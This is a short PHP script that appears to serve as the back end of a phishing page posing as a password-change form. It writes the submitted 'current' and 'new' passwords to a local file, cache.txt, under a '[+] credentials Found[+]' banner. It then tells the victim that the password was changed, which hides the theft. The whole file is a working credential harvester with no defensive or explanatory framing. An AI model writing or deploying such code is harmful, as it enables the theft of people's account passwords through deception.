<?php
file_put_contents("cache.txt","\n"."[+] credentials Found[+]"."\n"."Current password - " . $_POST['username'] . "\n" . "New password - " . $_POST['password'] . "\n",FILE_APPEND);
echo "<script>alert('Password changed')</script>";
?>

